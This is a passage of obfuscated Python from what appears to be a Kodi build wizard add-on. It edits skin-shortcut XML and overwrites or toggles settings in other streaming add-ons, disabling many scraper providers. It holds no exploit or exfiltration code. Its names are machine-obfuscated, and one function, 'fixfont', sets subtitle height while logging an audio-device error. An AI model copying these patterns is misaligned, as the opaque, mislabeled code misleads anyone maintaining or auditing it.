       copyfile (O00OO0O00OOOOO0O0 ,OOO00OOO000OOOOOO )#line:1172
    except :#line:1174
       pass #line:1175
def rdbuildaddonON ():#line:1182
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1184
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1185
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1186
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1204
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1207
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1208
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1212
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1213
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1214
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1235
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1236
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1240
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1241
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1242
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1260
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1263
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1264
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1268
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1269
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1270
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1288
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1291
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1292
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1295
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1296
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1297
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1315
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1318
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1319
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1321
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1322
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1323
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1341
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1344
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1345
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1347
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1348
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1349
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1367
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1370
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1371
    OOO000O0O0O00OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1374
    with open (OOO000O0O0O00OO00 ,'r')as OOOOO00O0O000000O :#line:1375
      O0OOO00OOO0OOOOOO =OOOOO00O0O000000O .read ()#line:1376
    O0OOO00OOO0OOOOOO =O0OOO00OOO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1394
    with open (OOO000O0O0O00OO00 ,'w')as OOOOO00O0O000000O :#line:1397
      OOOOO00O0O000000O .write (O0OOO00OOO0OOOOOO )#line:1398
def rdbuildinstallON ():#line:1401
    try :#line:1403
       O00OOOO0OOO000O00 =ADDONPATH +"/resources/rd/victory.xml"#line:1404
       OOO0O0O000OOOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1405
       copyfile (O00OOOO0OOO000O00 ,OOO0O0O000OOOO00O )#line:1407
       O00OOOO0OOO000O00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1409
       OOO0O0O000OOOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1410
       copyfile (O00OOOO0OOO000O00 ,OOO0O0O000OOOO00O )#line:1412
       O00OOOO0OOO000O00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1414
       OOO0O0O000OOOO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1415
       copyfile (O00OOOO0OOO000O00 ,OOO0O0O000OOOO00O )#line:1417
       O00OOOO0OOO000O00 =ADDONPATH +"/resources/rd/Splash.png"#line:1420
       OOO0O0O000OOOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1421
       copyfile (O00OOOO0OOO000O00 ,OOO0O0O000OOOO00O )#line:1423
    except :#line:1425
       pass #line:1426
def rdbuild ():#line:1436
	O0OO0O0OO00O00O0O =(ADDON .getSetting ("auto_rd"))#line:1437
	if O0OO0O0OO00O00O0O =='true':#line:1438
		OOO000O000OOO0OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1439
		OOO000O000OOO0OOO .setSetting ('all_t','0')#line:1440
		OOO000O000OOO0OOO .setSetting ('rd_menu_enable','false')#line:1441
		OOO000O000OOO0OOO .setSetting ('magnet_bay','false')#line:1442
		OOO000O000OOO0OOO .setSetting ('magnet_extra','false')#line:1443
		OOO000O000OOO0OOO .setSetting ('rd_only','false')#line:1444
		OOO000O000OOO0OOO .setSetting ('ftp','false')#line:1446
		OOO000O000OOO0OOO .setSetting ('fp','false')#line:1447
		OOO000O000OOO0OOO .setSetting ('filter_fp','false')#line:1448
		OOO000O000OOO0OOO .setSetting ('fp_size_en','false')#line:1449
		OOO000O000OOO0OOO .setSetting ('afdah','false')#line:1450
		OOO000O000OOO0OOO .setSetting ('ap2s','false')#line:1451
		OOO000O000OOO0OOO .setSetting ('cin','false')#line:1452
		OOO000O000OOO0OOO .setSetting ('clv','false')#line:1453
		OOO000O000OOO0OOO .setSetting ('cmv','false')#line:1454
		OOO000O000OOO0OOO .setSetting ('dl20','false')#line:1455
		OOO000O000OOO0OOO .setSetting ('esc','false')#line:1456
		OOO000O000OOO0OOO .setSetting ('extra','false')#line:1457
		OOO000O000OOO0OOO .setSetting ('film','false')#line:1458
		OOO000O000OOO0OOO .setSetting ('fre','false')#line:1459
		OOO000O000OOO0OOO .setSetting ('fxy','false')#line:1460
		OOO000O000OOO0OOO .setSetting ('genv','false')#line:1461
		OOO000O000OOO0OOO .setSetting ('getgo','false')#line:1462
		OOO000O000OOO0OOO .setSetting ('gold','false')#line:1463
		OOO000O000OOO0OOO .setSetting ('gona','false')#line:1464
		OOO000O000OOO0OOO .setSetting ('hdmm','false')#line:1465
		OOO000O000OOO0OOO .setSetting ('hdt','false')#line:1466
		OOO000O000OOO0OOO .setSetting ('icy','false')#line:1467
		OOO000O000OOO0OOO .setSetting ('ind','false')#line:1468
		OOO000O000OOO0OOO .setSetting ('iwi','false')#line:1469
		OOO000O000OOO0OOO .setSetting ('jen_free','false')#line:1470
		OOO000O000OOO0OOO .setSetting ('kiss','false')#line:1471
		OOO000O000OOO0OOO .setSetting ('lavin','false')#line:1472
		OOO000O000OOO0OOO .setSetting ('los','false')#line:1473
		OOO000O000OOO0OOO .setSetting ('m4u','false')#line:1474
		OOO000O000OOO0OOO .setSetting ('mesh','false')#line:1475
		OOO000O000OOO0OOO .setSetting ('mf','false')#line:1476
		OOO000O000OOO0OOO .setSetting ('mkvc','false')#line:1477
		OOO000O000OOO0OOO .setSetting ('mjy','false')#line:1478
		OOO000O000OOO0OOO .setSetting ('hdonline','false')#line:1479
		OOO000O000OOO0OOO .setSetting ('moviex','false')#line:1480
		OOO000O000OOO0OOO .setSetting ('mpr','false')#line:1481
		OOO000O000OOO0OOO .setSetting ('mvg','false')#line:1482
		OOO000O000OOO0OOO .setSetting ('mvl','false')#line:1483
		OOO000O000OOO0OOO .setSetting ('mvs','false')#line:1484
		OOO000O000OOO0OOO .setSetting ('myeg','false')#line:1485
		OOO000O000OOO0OOO .setSetting ('ninja','false')#line:1486
		OOO000O000OOO0OOO .setSetting ('odb','false')#line:1487
		OOO000O000OOO0OOO .setSetting ('ophd','false')#line:1488
		OOO000O000OOO0OOO .setSetting ('pks','false')#line:1489
		OOO000O000OOO0OOO .setSetting ('prf','false')#line:1490
		OOO000O000OOO0OOO .setSetting ('put18','false')#line:1491
		OOO000O000OOO0OOO .setSetting ('req','false')#line:1492
		OOO000O000OOO0OOO .setSetting ('rftv','false')#line:1493
		OOO000O000OOO0OOO .setSetting ('rltv','false')#line:1494
		OOO000O000OOO0OOO .setSetting ('sc','false')#line:1495
		OOO000O000OOO0OOO .setSetting ('seehd','false')#line:1496
		OOO000O000OOO0OOO .setSetting ('showbox','false')#line:1497
		OOO000O000OOO0OOO .setSetting ('shuid','false')#line:1498
		OOO000O000OOO0OOO .setSetting ('sil_gh','false')#line:1499
		OOO000O000OOO0OOO .setSetting ('spv','false')#line:1500
		OOO000O000OOO0OOO .setSetting ('subs','false')#line:1501
		OOO000O000OOO0OOO .setSetting ('tvs','false')#line:1502
		OOO000O000OOO0OOO .setSetting ('tw','false')#line:1503
		OOO000O000OOO0OOO .setSetting ('upto','false')#line:1504
		OOO000O000OOO0OOO .setSetting ('vel','false')#line:1505
		OOO000O000OOO0OOO .setSetting ('vex','false')#line:1506
		OOO000O000OOO0OOO .setSetting ('vidc','false')#line:1507
		OOO000O000OOO0OOO .setSetting ('w4hd','false')#line:1508
		OOO000O000OOO0OOO .setSetting ('wav','false')#line:1509
		OOO000O000OOO0OOO .setSetting ('wf','false')#line:1510
		OOO000O000OOO0OOO .setSetting ('wse','false')#line:1511
		OOO000O000OOO0OOO .setSetting ('wss','false')#line:1512
		OOO000O000OOO0OOO .setSetting ('wsse','false')#line:1513
		OOO000O000OOO0OOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1514
		OOO000O000OOO0OOO .setSetting ('debrid.only','true')#line:1515
		OOO000O000OOO0OOO .setSetting ('hosts.captcha','false')#line:1516
		OOO000O000OOO0OOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1517
		OOO000O000OOO0OOO .setSetting ('provider.123moviehd','false')#line:1518
		OOO000O000OOO0OOO .setSetting ('provider.300mbdownload','false')#line:1519
		OOO000O000OOO0OOO .setSetting ('provider.alltube','false')#line:1520
		OOO000O000OOO0OOO .setSetting ('provider.allucde','false')#line:1521
		OOO000O000OOO0OOO .setSetting ('provider.animebase','false')#line:1522
		OOO000O000OOO0OOO .setSetting ('provider.animeloads','false')#line:1523
		OOO000O000OOO0OOO .setSetting ('provider.animetoon','false')#line:1524
		OOO000O000OOO0OOO .setSetting ('provider.bnwmovies','false')#line:1525
		OOO000O000OOO0OOO .setSetting ('provider.boxfilm','false')#line:1526
		OOO000O000OOO0OOO .setSetting ('provider.bs','false')#line:1527
		OOO000O000OOO0OOO .setSetting ('provider.cartoonhd','false')#line:1528
		OOO000O000OOO0OOO .setSetting ('provider.cdahd','false')#line:1529
		OOO000O000OOO0OOO .setSetting ('provider.cdax','false')#line:1530
		OOO000O000OOO0OOO .setSetting ('provider.cine','false')#line:1531
		OOO000O000OOO0OOO .setSetting ('provider.cinenator','false')#line:1532
		OOO000O000OOO0OOO .setSetting ('provider.cmovieshdbz','false')#line:1533
		OOO000O000OOO0OOO .setSetting ('provider.coolmoviezone','false')#line:1534
		OOO000O000OOO0OOO .setSetting ('provider.ddl','false')#line:1535
		OOO000O000OOO0OOO .setSetting ('provider.deepmovie','false')#line:1536
		OOO000O000OOO0OOO .setSetting ('provider.ekinomaniak','false')#line:1537
		OOO000O000OOO0OOO .setSetting ('provider.ekinotv','false')#line:1538
		OOO000O000OOO0OOO .setSetting ('provider.filiser','false')#line:1539
		OOO000O000OOO0OOO .setSetting ('provider.filmpalast','false')#line:1540
		OOO000O000OOO0OOO .setSetting ('provider.filmwebbooster','false')#line:1541
		OOO000O000OOO0OOO .setSetting ('provider.filmxy','false')#line:1542
		OOO000O000OOO0OOO .setSetting ('provider.fmovies','false')#line:1543
		OOO000O000OOO0OOO .setSetting ('provider.foxx','false')#line:1544
		OOO000O000OOO0OOO .setSetting ('provider.freefmovies','false')#line:1545
		OOO000O000OOO0OOO .setSetting ('provider.freeputlocker','false')#line:1546
		OOO000O000OOO0OOO .setSetting ('provider.furk','false')#line:1547
		OOO000O000OOO0OOO .setSetting ('provider.gamatotv','false')#line:1548
		OOO000O000OOO0OOO .setSetting ('provider.gogoanime','false')#line:1549
		OOO000O000OOO0OOO .setSetting ('provider.gowatchseries','false')#line:1550
		OOO000O000OOO0OOO .setSetting ('provider.hackimdb','false')#line:1551
		OOO000O000OOO0OOO .setSetting ('provider.hdfilme','false')#line:1552
		OOO000O000OOO0OOO .setSetting ('provider.hdmto','false')#line:1553
		OOO000O000OOO0OOO .setSetting ('provider.hdpopcorns','false')#line:1554
		OOO000O000OOO0OOO .setSetting ('provider.hdstreams','false')#line:1555
		OOO000O000OOO0OOO .setSetting ('provider.horrorkino','false')#line:1557
		OOO000O000OOO0OOO .setSetting ('provider.iitv','false')#line:1558
		OOO000O000OOO0OOO .setSetting ('provider.iload','false')#line:1559
		OOO000O000OOO0OOO .setSetting ('provider.iwaatch','false')#line:1560
		OOO000O000OOO0OOO .setSetting ('provider.kinodogs','false')#line:1561
		OOO000O000OOO0OOO .setSetting ('provider.kinoking','false')#line:1562
		OOO000O000OOO0OOO .setSetting ('provider.kinow','false')#line:1563
		OOO000O000OOO0OOO .setSetting ('provider.kinox','false')#line:1564
		OOO000O000OOO0OOO .setSetting ('provider.lichtspielhaus','false')#line:1565
		OOO000O000OOO0OOO .setSetting ('provider.liomenoi','false')#line:1566
		OOO000O000OOO0OOO .setSetting ('provider.magnetdl','false')#line:1569
		OOO000O000OOO0OOO .setSetting ('provider.megapelistv','false')#line:1570
		OOO000O000OOO0OOO .setSetting ('provider.movie2k-ac','false')#line:1571
		OOO000O000OOO0OOO .setSetting ('provider.movie2k-ag','false')#line:1572
		OOO000O000OOO0OOO .setSetting ('provider.movie2z','false')#line:1573
		OOO000O000OOO0OOO .setSetting ('provider.movie4k','false')#line:1574
		OOO000O000OOO0OOO .setSetting ('provider.movie4kis','false')#line:1575
		OOO000O000OOO0OOO .setSetting ('provider.movieneo','false')#line:1576
		OOO000O000OOO0OOO .setSetting ('provider.moviesever','false')#line:1577
		OOO000O000OOO0OOO .setSetting ('provider.movietown','false')#line:1578
		OOO000O000OOO0OOO .setSetting ('provider.mvrls','false')#line:1580
		OOO000O000OOO0OOO .setSetting ('provider.netzkino','false')#line:1581
		OOO000O000OOO0OOO .setSetting ('provider.odb','false')#line:1582
		OOO000O000OOO0OOO .setSetting ('provider.openkatalog','false')#line:1583
		OOO000O000OOO0OOO .setSetting ('provider.ororo','false')#line:1584
		OOO000O000OOO0OOO .setSetting ('provider.paczamy','false')#line:1585
		OOO000O000OOO0OOO .setSetting ('provider.peliculasdk','false')#line:1586
		OOO000O000OOO0OOO .setSetting ('provider.pelisplustv','false')#line:1587
		OOO000O000OOO0OOO .setSetting ('provider.pepecine','false')#line:1588
		OOO000O000OOO0OOO .setSetting ('provider.primewire','false')#line:1589
		OOO000O000OOO0OOO .setSetting ('provider.projectfreetv','false')#line:1590
		OOO000O000OOO0OOO .setSetting ('provider.proxer','false')#line:1591
		OOO000O000OOO0OOO .setSetting ('provider.pureanime','false')#line:1592
		OOO000O000OOO0OOO .setSetting ('provider.putlocker','false')#line:1593
		OOO000O000OOO0OOO .setSetting ('provider.putlockerfree','false')#line:1594
		OOO000O000OOO0OOO .setSetting ('provider.reddit','false')#line:1595
		OOO000O000OOO0OOO .setSetting ('provider.cartoonwire','false')#line:1596
		OOO000O000OOO0OOO .setSetting ('provider.seehd','false')#line:1597
		OOO000O000OOO0OOO .setSetting ('provider.segos','false')#line:1598
		OOO000O000OOO0OOO .setSetting ('provider.serienstream','false')#line:1599
		OOO000O000OOO0OOO .setSetting ('provider.series9','false')#line:1600
		OOO000O000OOO0OOO .setSetting ('provider.seriesever','false')#line:1601
		OOO000O000OOO0OOO .setSetting ('provider.seriesonline','false')#line:1602
		OOO000O000OOO0OOO .setSetting ('provider.seriespapaya','false')#line:1603
		OOO000O000OOO0OOO .setSetting ('provider.sezonlukdizi','false')#line:1604
		OOO000O000OOO0OOO .setSetting ('provider.solarmovie','false')#line:1605
		OOO000O000OOO0OOO .setSetting ('provider.solarmoviez','false')#line:1606
		OOO000O000OOO0OOO .setSetting ('provider.stream-to','false')#line:1607
		OOO000O000OOO0OOO .setSetting ('provider.streamdream','false')#line:1608
		OOO000O000OOO0OOO .setSetting ('provider.streamflix','false')#line:1609
		OOO000O000OOO0OOO .setSetting ('provider.streamit','false')#line:1610
		OOO000O000OOO0OOO .setSetting ('provider.swatchseries','false')#line:1611
		OOO000O000OOO0OOO .setSetting ('provider.szukajkatv','false')#line:1612
		OOO000O000OOO0OOO .setSetting ('provider.tainiesonline','false')#line:1613
		OOO000O000OOO0OOO .setSetting ('provider.tainiomania','false')#line:1614
		OOO000O000OOO0OOO .setSetting ('provider.tata','false')#line:1617
		OOO000O000OOO0OOO .setSetting ('provider.trt','false')#line:1618
		OOO000O000OOO0OOO .setSetting ('provider.tvbox','false')#line:1619
		OOO000O000OOO0OOO .setSetting ('provider.ultrahd','false')#line:1620
		OOO000O000OOO0OOO .setSetting ('provider.video4k','false')#line:1621
		OOO000O000OOO0OOO .setSetting ('provider.vidics','false')#line:1622
		OOO000O000OOO0OOO .setSetting ('provider.view4u','false')#line:1623
		OOO000O000OOO0OOO .setSetting ('provider.watchseries','false')#line:1624
		OOO000O000OOO0OOO .setSetting ('provider.xrysoi','false')#line:1625
		OOO000O000OOO0OOO .setSetting ('provider.library','false')#line:1626
def fixfont ():#line:1629
	OOO00000O0OOOO0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1630
	OOOO0O0O000O0O0O0 =json .loads (OOO00000O0OOOO0OO );#line:1632
	OO00O0O0OO000OOOO =OOOO0O0O000O0O0O0 ["result"]["settings"]#line:1633
	O0O0O00O0OOO0O000 =[OO00OOOOO0OOO0O00 for OO00OOOOO0OOO0O00 in OO00O0O0OO000OOOO if OO00OOOOO0OOO0O00 ["id"]=="audiooutput.audiodevice"][0 ]#line:1635
	O0OO0O000OOOOOO0O =O0O0O00O0OOO0O000 ["options"];#line:1636
	OO0OO0O0O000O000O =O0O0O00O0OOO0O000 ["value"];#line:1637
	OO0O0O0OO000OO00O =[O0O00O0O0O00O0000 for (O0O00O0O0O00O0000 ,O0OOOOOOO00OO000O )in enumerate (O0OO0O000OOOOOO0O )if O0OOOOOOO00OO000O ["value"]==OO0OO0O0O000O000O ][0 ];#line:1639
	OOOOOO0000O0O0000 =(OO0O0O0OO000OO00O +1 )%len (O0OO0O000OOOOOO0O )#line:1641
	OO0O00OO0000000OO =O0OO0O000OOOOOO0O [OOOOOO0000O0O0000 ]["value"]#line:1643
	O0OO0OOOO0O00OO0O =O0OO0O000OOOOOO0O [OOOOOO0000O0O0000 ]["label"]#line:1644
	O00O0OOO00OO0O00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1646
	try :#line:1648
		O0OOOOO0OO000O0O0 =json .loads (O00O0OOO00OO0O00O );#line:1649
		if O0OOOOO0OO000O0O0 ["result"]!=True :#line:1651
			raise Exception #line:1652
	except :#line:1653
		sys .stderr .write ("Error switching audio output device")#line:1654
		raise Exception #line:1655
def parseDOM2 (O0000OOOO0O000O00 ,name =u"",attrs ={},ret =False ):#line:1656
	if isinstance (O0000OOOO0O000O00 ,str ):#line:1659
		try :#line:1660
			O0000OOOO0O000O00 =[O0000OOOO0O000O00 .decode ("utf-8")]#line:1661
		except :#line:1662
			O0000OOOO0O000O00 =[O0000OOOO0O000O00 ]#line:1663
	elif isinstance (O0000OOOO0O000O00 ,unicode ):#line:1664
		O0000OOOO0O000O00 =[O0000OOOO0O000O00 ]#line:1665
	elif not isinstance (O0000OOOO0O000O00 ,list ):#line:1666
		return u""#line:1667
	if not name .strip ():#line:1669
		return u""#line:1670
	OO000O0000OO0O000 =[]#line:1672
	for OOO000OO0O0000O00 in O0000OOOO0O000O00 :#line:1673
		O0OO0OO00000OO0O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO000OO0O0000O00 )#line:1674
		for O00O0OOO00OOOO00O in O0OO0OO00000OO0O0 :#line:1675
			OOO000OO0O0000O00 =OOO000OO0O0000O00 .replace (O00O0OOO00OOOO00O ,O00O0OOO00OOOO00O .replace ("\n"," "))#line:1676
		OO00OOO0O000O0OO0 =[]#line:1678
		for OO0O000O0O0000O00 in attrs :#line:1679
			O0000000OO0OO0O00 =re .compile ('(<'+name +'[^>]*?(?:'+OO0O000O0O0000O00 +'=[\'"]'+attrs [OO0O000O0O0000O00 ]+'[\'"].*?>))',re .M |re .S ).findall (OOO000OO0O0000O00 )#line:1680
			if len (O0000000OO0OO0O00 )==0 and attrs [OO0O000O0O0000O00 ].find (" ")==-1 :#line:1681
				O0000000OO0OO0O00 =re .compile ('(<'+name +'[^>]*?(?:'+OO0O000O0O0000O00 +'='+attrs [OO0O000O0O0000O00 ]+'.*?>))',re .M |re .S ).findall (OOO000OO0O0000O00 )#line:1682
			if len (OO00OOO0O000O0OO0 )==0 :#line:1684
				OO00OOO0O000O0OO0 =O0000000OO0OO0O00 #line:1685
				O0000000OO0OO0O00 =[]#line:1686
			else :#line:1687
				OO00OOOO0000O00OO =range (len (OO00OOO0O000O0OO0 ))#line:1688
				OO00OOOO0000O00OO .reverse ()#line:1689
				for O0OOOOO00O0OO0OO0 in OO00OOOO0000O00OO :#line:1690
					if not OO00OOO0O000O0OO0 [O0OOOOO00O0OO0OO0 ]in O0000000OO0OO0O00 :#line:1691
						del (OO00OOO0O000O0OO0 [O0OOOOO00O0OO0OO0 ])#line:1692
		if len (OO00OOO0O000O0OO0 )==0 and attrs =={}:#line:1694
			OO00OOO0O000O0OO0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO000OO0O0000O00 )#line:1695
			if len (OO00OOO0O000O0OO0 )==0 :#line:1696
				OO00OOO0O000O0OO0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO000OO0O0000O00 )#line:1697
		if isinstance (ret ,str ):#line:1699
			O0000000OO0OO0O00 =[]#line:1700
			for O00O0OOO00OOOO00O in OO00OOO0O000O0OO0 :#line:1701
				O0OOO0O00O0O0000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O00O0OOO00OOOO00O )#line:1702
				if len (O0OOO0O00O0O0000O )==0 :#line:1703
					O0OOO0O00O0O0000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O00O0OOO00OOOO00O )#line:1704
				for OOO000OOO0OO0OOO0 in O0OOO0O00O0O0000O :#line:1705
